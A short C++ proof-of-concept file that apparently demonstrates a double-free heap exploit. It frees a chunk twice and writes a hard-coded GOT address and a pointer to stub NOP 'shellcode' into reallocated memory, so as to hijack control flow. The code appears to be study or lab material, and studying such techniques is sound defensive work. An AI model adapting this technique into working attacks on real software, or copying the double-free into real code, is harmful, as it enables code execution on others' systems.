#include<iostream>
#include<string.h>

using namespace std;

 static char *GOT_LOCATION = (char *)0x0804c98c;
   static char shellcode[] =
    "\xeb\x0cjump12chars_" /* jump */
    "\x90\x90\x90\x90\x90\x90\x90\x90";
  int main(void) {
    int size = sizeof(shellcode);
    char *shellcode_location;
    char *first, *second, *third, *fourth;
    char *fifth, *sixth, *seventh;
    shellcode_location =(char *) malloc(size);
    strcpy(shellcode_location, shellcode);
    first = (char *)malloc(256);
    second = (char *)malloc(256);
    third = (char *)malloc(256);
    fourth = (char *)malloc(256);

    free(first);
    // cout<<"hello";
    free(third);
    fifth = (char *)malloc(128);
    free(first);                 // double-free
    sixth = (char *)malloc(256);
    *((char **)(sixth+0)) = GOT_LOCATION-12;
    *((char **)(sixth+4)) = shellcode_location;
    seventh = (char *)malloc(256);
    strcpy(fifth, "something");
    //cout<<fifth;
    return 0;
  }